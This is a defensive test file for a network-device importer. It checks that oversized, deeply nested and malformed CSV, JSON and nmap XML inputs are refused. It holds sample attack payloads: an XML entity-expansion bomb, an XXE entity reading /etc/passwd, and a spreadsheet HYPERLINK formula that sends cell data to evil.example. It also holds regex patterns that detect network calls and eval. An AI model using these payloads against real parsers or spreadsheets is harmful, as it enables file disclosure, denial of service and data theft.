// Files someone made to hurt us: too big, too nested, entity bombs, spreadsheet formulas.

import { describe, expect, it } from 'vitest';

import { gateTable } from './gate';
import { LIMITS } from './limits';
import { readFile, readImport } from './read';
import { stubRedact, miniXml, fixture } from './testkit';
import { neutraliseFormula, stripUnsafe, toHostname } from './text';
import { checkXml } from './xml';

const csvOf = (rows: number) => `name,ip\n${Array.from({ length: rows }, (_, i) => `h${i},10.0.0.1`).join('\n')}\n`;

describe('size and row caps', () => {
  it('refuses a file over the size cap without reading it', async () => {
    const big = new File([new Uint8Array(LIMITS.bytes + 1)], 'big.csv');
    await expect(readFile(big)).rejects.toThrow(/limit is 5\.0 MB/);
  });

  it('refuses more rows than the cap, stops early, and accepts exactly the cap', () => {
    expect(readImport(csvOf(LIMITS.rows)).rows).toHaveLength(LIMITS.rows);
    expect(() => readImport(csvOf(LIMITS.rows + 1))).toThrow(/more than 2000 rows/);
    const recs = JSON.stringify(Array.from({ length: LIMITS.rows + 1 }, (_, i) => ({ name: `h${i}`, device_type: 'x' })));
    expect(() => readImport(recs)).toThrow(/more than 2000 rows/);
  });

  it('refuses a row with hundreds of columns', () => {
    expect(() => readImport(`${Array.from({ length: 400 }, (_, i) => `c${i}`).join(',')}\n${Array.from({ length: 400 }, () => 'x').join(',')}\n`)).toThrow(/columns/);
  });

  it('cuts one enormous cell before the gate sees it', async () => {
    const seen: number[] = [];
    const t = await gateTable(readImport(`name,notes\nsw,${'a'.repeat(LIMITS.cellChars * 3)}\n`), async (s) => {
      seen.push(s.length);
      return s;
    });
    expect(Math.max(...seen)).toBeLessThanOrEqual(LIMITS.cellChars);
    expect(t.truncated).toBe(1);
  });
});

describe('JSON that is huge or deeply nested', () => {
  it('refuses nesting past the depth cap without recursing (a million levels is safe)', () => {
    expect(() => readImport('['.repeat(1_000_000))).toThrow(/nested more than 64/);
    expect(() => readImport(`${'{"a":'.repeat(65)}1${'}'.repeat(65)}`)).toThrow(/nested more than 64/);
  });

  it('accepts nesting at the cap', () => {
    const nested = `${'{"a":'.repeat(LIMITS.jsonDepth - 2)}1${'}'.repeat(LIMITS.jsonDepth - 2)}`;
    expect(() => readImport(`[{"name":"x","deep":${nested}}]`)).not.toThrow(/nested/);
  });

  it('refuses a file with far more entries than a device list', () => {
    expect(() => readImport(`[${'1,'.repeat(LIMITS.jsonTokens)}1]`)).toThrow(/far more entries/);
  });

  it('ignores braces and brackets inside strings, and keeps __proto__ a plain column', () => {
    const t = readImport('[{"name":"a","note":"]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]","__proto__":{"polluted":"yes"}}]');
    expect(t.headers).toContain('__proto__.polluted');
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it('refuses text that is not JSON', () => {
    expect(() => readImport('{"name": ')).toThrow(/not valid JSON/);
  });
});

describe('XML entities and bombs', () => {
  const bomb = `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<nmaprun><host><status state="up"/><address addr="&lol3;" addrtype="ipv4"/></host></nmaprun>`;
  const xxe = `<?xml version="1.0"?><!DOCTYPE nmaprun [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><nmaprun><host><hostnames><hostname name="&xxe;"/></hostnames></host></nmaprun>`;

  it.each([
    ['an entity-expansion bomb', bomb],
    ['an external entity', xxe],
    ['a DOCTYPE with a system id', '<!DOCTYPE nmaprun SYSTEM "http://evil.example/x.dtd"><nmaprun/>'],
    ['a lower-case doctype', '<!doctype nmaprun [<!ENTITY a "b">]><nmaprun/>'],
    ['an entity declared without a DOCTYPE tag', '<nmaprun><!ENTITY a "b"></nmaprun>'],
    ['a second DOCTYPE after the bare one', '<!DOCTYPE nmaprun><!DOCTYPE nmaprun [<!ENTITY a "b">]><nmaprun/>'],
    ['a DOCTYPE hidden in a comment', '<nmaprun><!-- <!DOCTYPE x [<!ENTITY a "b">]> --></nmaprun>'],
  ])('refuses %s before any parser sees it', (_n, xml) => {
    let parsed = false;
    expect(() => readImport(xml, { xml: (x) => ((parsed = true), miniXml(x)) })).toThrow(/declares a document type or entities/);
    expect(parsed).toBe(false);
  });

  it('accepts the bare DOCTYPE real nmap writes, and cuts it out before parsing', () => {
    const out = checkXml('<?xml version="1.0"?>\n<!DOCTYPE nmaprun>\n<nmaprun/>');
    expect(out).not.toContain('DOCTYPE');
    expect(readImport(fixture('nmap.xml'), { xml: miniXml }).kind).toBe('nmap');
  });

  it('refuses an element flood and XML that is not an nmap scan', () => {
    expect(() => readImport(`<nmaprun>${'<a/>'.repeat(LIMITS.xmlElements + 1)}</nmaprun>`, { xml: miniXml })).toThrow(/far more elements/);
    expect(() => readImport('<html><body/></html>', { xml: miniXml })).toThrow(/not an nmap scan/);
  });
});

describe('spreadsheet formulas', () => {
  it.each(['=1+1', '+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1', '=HYPERLINK("http://x")'])('keeps %j as text', (cell) => {
    const out = neutraliseFormula(cell, stripUnsafe(cell).trim());
    expect(out.changed).toBe(true);
    expect(out.text.startsWith("'")).toBe(true);
  });

  it.each(['-5', '12', '3.5', 'sw-01', 'a=b', '10.0.0.1'])('leaves %j alone', (cell) => {
    expect(neutraliseFormula(cell, cell).changed).toBe(false);
  });

  it('neutralises on import, counts it, and the stored name starts with an apostrophe', async () => {
    const gated = await gateTable(readImport(fixture('netbox-devices.csv')), stubRedact);
    expect(gated.neutralised).toBeGreaterThanOrEqual(4);
    expect(gated.rows.flat().filter((c) => /^[=+@]/.test(c))).toEqual([]);
    expect(gated.rows.some((r) => r[0] === `'=HYPERLINK("http://evil.example/?x="&A1)`)).toBe(true);
  });
});

describe('characters in names', () => {
  it('drops control and bidi characters', () => {
    expect(stripUnsafe('sw‮-01\u0000​⁦x⁩')).toBe('sw-01x');
    expect(toHostname('sw‮-01')).toBe('sw-01');
    expect(toHostname('core switch 2')).toBe('core-switch-2');
    expect(toHostname('café')).toBeNull();
  });
});

const sources = import.meta.glob(['./*.{ts,tsx}', '../components/import/*.{ts,tsx}'], { query: '?raw', import: 'default', eager: true }) as Record<string, string>;

describe('the importer makes no calls and runs no text', () => {
  const files = Object.entries(sources).filter(([f]) => !/\.test\.ts$|testkit/.test(f));
  it.each([
    ['network calls', /\bfetch\s*\(|XMLHttpRequest|WebSocket|sendBeacon|EventSource|signedFetch/],
    ['running text', /\beval\s*\(|new\s+Function\s*\(|\bFunction\s*\(|setTimeout\s*\(\s*['"`]/],
    ['HTML from strings', /dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|document\.write/],
    ['stored tokens', /localStorage|sessionStorage|indexedDB|document\.cookie/],
  ])('no source file uses %s', (_n, re) => {
    expect(files.length).toBeGreaterThan(8);
    for (const [name, src] of files) expect(src.replace(/\/\/.*$/gm, ''), name).not.toMatch(re);
  });
});
